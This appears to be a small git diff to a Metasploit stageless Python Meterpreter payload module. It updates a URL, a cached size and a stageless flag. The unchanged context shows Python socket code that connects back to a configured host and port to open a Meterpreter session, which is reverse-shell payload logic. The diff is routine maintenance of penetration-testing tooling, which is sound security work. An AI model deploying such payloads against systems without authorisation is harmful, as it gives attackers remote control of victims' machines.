@@ -1,5 +1,5 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
@@ -11,7 +11,7 @@ require 'msf/base/sessions/meterpreter_python'
 
 module MetasploitModule
 
-  CachedSize = 53570
+  CachedSize = 56486
 
   include Msf::Payload::Single
   include Msf::Payload::Python
@@ -35,9 +35,9 @@ module MetasploitModule
     socket_setup  = "s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n"
     socket_setup << "s.connect(('#{opts[:host]}',#{opts[:port]}))\n"
     opts[:stageless_tcp_socket_setup] = socket_setup
+    opts[:stageless] = true
 
     met = stage_meterpreter(opts)
     py_create_exec_stub(met)
   end
-
 end
